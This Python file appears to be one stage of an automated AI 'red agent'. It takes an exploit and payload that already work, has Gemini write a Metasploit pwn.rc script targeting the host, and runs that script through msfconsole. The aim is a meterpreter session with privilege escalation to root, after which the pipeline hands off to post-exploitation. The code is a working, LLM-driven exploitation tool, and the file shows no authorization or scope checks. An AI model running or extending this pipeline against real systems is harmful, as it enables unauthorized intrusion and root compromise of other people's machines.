#!/usr/bin/env python3
"""
NODE 6: GPT PWN.RC GENERATION & EXECUTION
Generates pwn.rc using GPT and executes it to get meterpreter + privilege escalation
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

# # GPT CODE (COMMENTED OUT - USING GEMINI INSTEAD)
# try:
#     from openai import OpenAI
# except ImportError:
#     OpenAI = None

# Gemini API
try:
    import google.generativeai as genai
except ImportError:
    genai = None


def node_6_pwn_rc_generation(state: Dict) -> Dict:
    """
    NODE 6: GPT pwn.rc Generation & Execution

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    After Node 5 gets a basic shell with a working exploit + payload, this node:
    1. Sends exploit details to GPT-4
    2. GPT generates a pwn.rc file using a demo template
    3. Saves pwn.rc to session folder
    4. Executes pwn.rc via msfconsole
    5. Gets meterpreter session + privilege escalation in one shot

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    From Node 5:
    - successful_payloads: List with working payload/exploit
    - primary_session_id: Basic shell session ID
    - target: Target IP address
    - lhost: Attacker IP address
    - session_folder: Path to session directory

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - primary_session_id: New meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)
    - privilege_level: "high"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_6")

    logger.info("═" * 70)
    logger.info("NODE 6: GPT PWN.RC GENERATION & EXECUTION")
    logger.info("═" * 70)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: VALIDATE PREREQUISITES
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Validating Prerequisites")
    logger.info("─" * 70)

    # Get working exploit and payload from Node 5
    successful_payloads = state.get("successful_payloads", [])
    if not successful_payloads:
        logger.error("❌ No successful payloads from Node 5")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "No successful payloads available"
        }

    payload_info = successful_payloads[0]
    exploit_module = payload_info.get("exploit_path", "unknown")  # exploit_path from Node 5
    payload = payload_info.get("payload", "unknown")
    target = state.get("target")
    lhost = state.get("lhost")
    session_folder = state.get("session_folder")

    # Get target OS information for GPT context
    target_os = state.get("detected_os", "Linux (unknown)")
    service_name = state.get("service", "unknown")
    service_version = state.get("service_version", "unknown")

    # If session_folder not set, create one in exploitations directory
    if not session_folder:
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        exploitations_dir = Path(__file__).parent.parent / "exploitations"
        exploitations_dir.mkdir(exist_ok=True)
        session_folder = exploitations_dir / f"exploit_{target}_{state.get('port', 'unknown')}_gpt_{timestamp}"
        Path(session_folder).mkdir(exist_ok=True)
        logger.info(f"Created session folder: {session_folder}")
        state["session_folder"] = str(session_folder)

    logger.info(f"✓ Exploit: {exploit_module}")
    logger.info(f"✓ Payload: {payload}")
    logger.info(f"✓ Target (RHOST): {target}")
    logger.info(f"✓ Attacker (LHOST): {lhost}")
    logger.info(f"✓ Target OS: {target_os}")
    logger.info(f"✓ Service: {service_name} {service_version}")
    logger.info("")

    # # Check OpenAI API key (COMMENTED OUT - USING GEMINI)
    # openai_api_key = os.getenv("OPENAI_API_KEY")
    # if not openai_api_key or openai_api_key == "your_openai_api_key_here":
    #     logger.error("❌ OPENAI_API_KEY not set in .env file")
    #     return {
    #         **state,
    #         "pwn_rc_generated": False,
    #         "error": "OPENAI_API_KEY not configured"
    #     }

    # if not OpenAI:
    #     logger.error("❌ OpenAI library not installed")
    #     logger.error("   Install with: pip install openai")
    #     return {
    #         **state,
    #         "pwn_rc_generated": False,
    #         "error": "OpenAI library not installed"
    #     }

    # Check Gemini API key
    gemini_api_key = os.getenv("GEMINI_API_KEY")
    if not gemini_api_key or gemini_api_key == "your_gemini_api_key_here":
        logger.error("❌ GEMINI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "GEMINI_API_KEY not configured"
        }

    if not genai:
        logger.error("❌ Google Generative AI library not installed")
        logger.error("   Install with: pip install google-generativeai")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Google Generative AI library not installed"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: READ DEMO PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Reading Demo pwn.rc Template")
    logger.info("─" * 70)

    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc not found at {demo_pwn_rc}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Demo pwn.rc not found at {demo_pwn_rc}"
        }

    try:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Read demo pwn.rc ({len(demo_content)} bytes)")
    except Exception as e:
        logger.error(f"❌ Failed to read demo pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to read demo pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: SEND TO GEMINI FOR PWN.RC GENERATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Generating pwn.rc via Gemini")
    logger.info("─" * 70)

    try:
        # # GPT CODE (COMMENTED OUT - USING GEMINI)
        # client = OpenAI(api_key=openai_api_key)
        # prompt = f"""..."""
        # logger.info("Sending request to GPT-4...")
        # logger.info(f"  Exploit: {exploit_module}")
        # logger.info(f"  Payload: {payload}")
        # logger.info(f"  Target: {target}")
        # response = client.chat.completions.create(
        #     model="gpt-4",
        #     messages=[
        #         {
        #             "role": "system",
        #             "content": "You are an expert Metasploit framework specialist. You generate only Ruby pwn.rc files. Always use the structure provided in examples. Never add explanations or markdown formatting."
        #         },
        #         {"role": "user", "content": prompt}
        #     ],
        #     temperature=0.2,
        #     max_tokens=4000
        # )
        # generated_pwn_rc = response.choices[0].message.content.strip()
        # logger.info(f"✓ GPT-4 generated pwn.rc ({len(generated_pwn_rc)} bytes)")

        # Gemini API call
        prompt = f"""You are a Metasploit pwn.rc file generator.

TARGET INFORMATION:
- Machine: {target_os}
- Service: {service_name} {service_version}
- IP Address: {target}

I have a working exploit and payload that successfully gives me a basic shell. Now I need you to generate a complete pwn.rc file that will:
1. Use the SAME exploit: {exploit_module}
2. Use the SAME payload: {payload}
3. Target the same host: {target}
4. Use LHOST: {lhost}
5. Upgrade the shell to meterpreter using 'sessions -u' command
6. Attempt privilege escalation to get root meterpreter on {target_os}

Here is a REAL WORKING EXAMPLE pwn.rc file that follows the exact structure and pattern you should use:

```ruby
{demo_content}
```

NOW: Generate a NEW pwn.rc file for my specific exploit ({service_name} on {target_os}), following this exact structure and style:

REQUIREMENTS:
- Replace the exploit module with: {exploit_module}
- Replace the payload with: {payload}
- Replace RHOST with: {target}
- Replace LHOST with: {lhost}
- Keep ALL helper functions (log_info, log_success, log_error, wait_for_new_session, etc)
- Keep the same Ruby syntax and structure
- Generate random ports using get_random_available_port
- Include sessions -u upgrade step
- Include privilege escalation attempt (appropriate for {target_os})
- Use run_single() for msfconsole commands
- Include proper error handling
- **CONDITIONAL EXIT: Only include run_single("exit") if NO meterpreter session obtained. If meterpreter obtained, KEEP msfconsole open for post-exploitation**

CRITICAL: Generate ONLY the pwn.rc Ruby code. No explanations, no markdown, no ```  blocks. Start with #!/usr/bin/env ruby
"""

        genai.configure(api_key=gemini_api_key)
        logger.info("Sending request to Gemini...")
        logger.info(f"  Exploit: {exploit_module}")
        logger.info(f"  Payload: {payload}")
        logger.info(f"  Target: {target}")

        model = genai.GenerativeModel(
            model_name="gemini-pro",
            generation_config={
                "temperature": 0.2,
                "max_output_tokens": 4000,
            },
            system_instruction="You are an expert Metasploit framework specialist. You generate only Ruby pwn.rc files. Always use the structure provided in examples. Never add explanations or markdown formatting."
        )

        response = model.generate_content(prompt)
        generated_pwn_rc = response.text.strip()
        logger.info(f"✓ Gemini generated pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ Gemini generation failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Gemini generation failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Saving Generated pwn.rc")
    logger.info("─" * 70)

    try:
        pwn_rc_path = Path(session_folder) / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")
    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Executing pwn.rc via msfconsole")
    logger.info("─" * 70)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("This will exploit the target and escalate privileges...")
    logger.info("")

    try:
        # Run msfconsole with output visible (not captured)
        # This allows the user to see what's happening
        # Uses quiet mode but still shows exploitation progress
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,  # Show output directly
            timeout=300  # 5 minute timeout
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting 5 seconds for sessions to be registered...")

        # Wait for sessions to be available in MSF RPC
        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out")
        logger.info("Continuing to check for sessions...")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Checking for Meterpreter Session")
    logger.info("─" * 70)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(5)  # Wait for sessions to be registered
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            # Get the latest/highest session ID (most recent)
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            # Check if it's root
            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found")
            logger.warning("   Returning to graph for fallback routing...")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "primary_session_type": None,  # Explicitly set to None so graph routing detects failure
                "note": "pwn.rc executed but no meterpreter session detected - fallback needed"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        logger.warning("   Returning to graph for fallback routing...")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "primary_session_type": None,  # Explicitly set to None so graph routing detects failure
            "note": f"pwn.rc executed, error checking sessions: {str(e)} - fallback needed"
        }
